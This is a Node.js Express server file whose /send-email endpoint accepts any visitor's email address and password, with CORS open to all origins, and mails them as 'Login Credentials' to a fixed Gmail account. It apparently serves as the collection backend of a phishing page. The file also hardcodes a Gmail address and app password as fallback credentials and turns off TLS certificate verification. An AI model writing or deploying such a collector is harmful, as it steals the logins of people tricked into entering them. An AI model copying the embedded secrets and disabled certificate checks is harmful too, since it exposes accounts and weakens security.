const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({
    origin: "*",
    credentials: true
}));
app.use(express.json());

// Enhanced transporter creation with better error handling
function createTransporter() {
  try {
    // Check if required environment variables are present
    const emailUser = process.env.EMAIL_USER || 'abhiisheek1@gmail.com';
    const emailPass = process.env.EMAIL_PASS || 'kyqd ecvf avzp ayzo';
    
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      console.warn('WARNING: EMAIL_USER or EMAIL_PASS not set in environment variables');
    }
    
    // Primary Gmail configuration with Render-friendly settings
    const gmailConfig = {
      host: 'smtp.gmail.com',
      port: 587,
      secure: false, // true for 465, false for other ports
      auth: {
        user: emailUser,
        pass: emailPass
      },
      tls: {
        rejectUnauthorized: false
      },
      // Connection settings optimized for cloud environments
      pool: true,
      maxConnections: 1,
      maxMessages: 100,
      rateDelta: 1000,
      rateLimit: 5,
      connectionTimeout: 30000,
      greetingTimeout: 30000,
      socketTimeout: 30000
    };

    console.log('Creating transporter with Gmail config');
    const transporter = nodemailer.createTransport(gmailConfig);
    
    // Test the configuration
    transporter.verify((error, success) => {
      if (error) {
        console.warn('Transporter configuration warning:', error.message);
        // Don't fail completely, as some providers don't support verify
      } else {
        console.log('Transporter configuration verified successfully');
      }
    });
    
    return transporter;
  } catch (error) {
    console.error('Failed to create transporter:', error);
    return null;
  }
}

// Create transporter
let transporter = createTransporter();

// Email sending endpoint
app.post('/send-email', async (req, res) => {
  try {
    const {email, password} = req.body;
    
    // Validate input
    if (!email || !password) {
      return res.status(400).json({ 
        success: false, 
        message: 'Email and password are required fields'
      });
    }
    
    // Default to recipient from env or the same as sender
    const recipient = process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER || email;
    
    console.log('Attempting to send email to:', recipient);
    console.log('Using sender:', process.env.EMAIL_USER || 'abhiisheek1@gmail.com');
    
    // Check if transporter exists
    if (!transporter) {
      return res.status(500).json({
        success: false,
        message: 'Email service is not properly configured. Please check server logs.'
      });
    }
    
    // Try to send email with improved error handling
    console.log('Sending email...');
    let info;
    try {
      // Send mail with explicit timeout handling
      const sendPromise = transporter.sendMail({
        from: process.env.EMAIL_USER || 'abhiisheek1@gmail.com',
        to: recipient,
        subject: 'Login Credentials',
        text: 'Your login credentials are: \n Email: ' + email + '\n Password: ' + password
      });
      
      // Implement timeout manually
      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('Email send operation timed out after 30 seconds')), 30000);
      });
      
      info = await Promise.race([sendPromise, timeoutPromise]);
      console.log('SendMail completed, info object:', info);
    } catch (sendError) {
      console.error('Error during sendMail:', sendError);
      
      // Provide more specific error handling
      let errorMessage = 'Failed to send email';
      
      if (sendError.code === 'ECONNECTION' || sendError.code === 'ETIMEDOUT') {
        errorMessage = 'Connection to email server failed. This commonly occurs in cloud hosting environments due to network restrictions. Consider using an email service provider like SendGrid or Mailgun.';
      } else if (sendError.code === 'EAUTH') {
        errorMessage = 'Authentication failed. Please verify your email credentials are correct and you\'re using an App Password for Gmail.';
      } else if (sendError.message.includes('timeout')) {
        errorMessage = 'Email operation timed out. The connection to the email server is taking too long, possibly due to network restrictions.';
      } else {
        errorMessage = 'Failed to send email: ' + sendError.message;
      }
      
      return res.status(500).json({
        success: false,
        message: errorMessage,
        code: sendError.code || 'SEND_ERROR'
      });
    }
    
    // Success response
    if (info) {
      console.log('Email sent successfully');
      console.log('Message ID:', info.messageId);
      res.status(200).json({ 
        success: true, 
        message: 'Email sent successfully', 
        messageId: info.messageId
      });
    } else {
      console.log('Email function completed but no info object returned');
      res.status(200).json({ 
        success: true, 
        message: 'Email function completed successfully'
      });
    }
  } catch (error) {
    console.error('Unexpected error sending email:', error);
    res.status(500).json({ 
      success: false, 
      message: 'An unexpected error occurred while sending the email',
      error: error.message
    });
  }
});

// Health check endpoint
app.get('/', (req, res) => {
  res.status(200).json({ 
    success: true, 
    message: 'Email API is running!',
    timestamp: new Date().toISOString(),
    transporter: transporter ? 'configured' : 'not configured'
  });
});

// Test transporter endpoint
app.get('/test-transporter', async (req, res) => {
  try {
    if (!transporter) {
      return res.status(500).json({ 
        success: false, 
        message: 'Email transporter is not configured properly' 
      });
    }
    
    res.status(200).json({ 
      success: true, 
      message: 'Transporter exists and is configured',
      config: {
        host: transporter.options.host,
        port: transporter.options.port,
        secure: transporter.options.secure
      }
    });
  } catch (error) {
    console.error('Transporter test error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Transporter test failed',
      error: error.message
    });
  }
});

// Reinitialize transporter endpoint
app.post('/reinit-transporter', (req, res) => {
  try {
    console.log('Reinitializing transporter...');
    transporter = createTransporter();
    if (transporter) {
      res.status(200).json({ 
        success: true, 
        message: 'Transporter reinitialized successfully' 
      });
    } else {
      res.status(500).json({ 
        success: false, 
        message: 'Failed to reinitialize transporter' 
      });
    }
  } catch (error) {
    console.error('Transporter reinitialization error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Transporter reinitialization failed',
      error: error.message
    });
  }
});

const server = app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
  
  // Log environment info
  console.log('Environment variables:');
  console.log('- EMAIL_USER:', process.env.EMAIL_USER ? `${process.env.EMAIL_USER.substring(0, 5)}...@${process.env.EMAIL_USER.split('@')[1]}` : 'Not set');
  console.log('- EMAIL_PASS:', process.env.EMAIL_PASS ? 'SET (App Password)' : 'Not set');
  console.log('- RECIPIENT_EMAIL:', process.env.RECIPIENT_EMAIL ? 'SET' : 'Not set');
  console.log('- PORT:', PORT);
  
  // Test transporter availability
  if (transporter) {
    console.log('Transporter initialized successfully');
  } else {
    console.log('WARNING: Transporter failed to initialize');
  }
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('Process terminated');
  });
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully');
  server.close(() => {
    console.log('Process terminated');
  });
});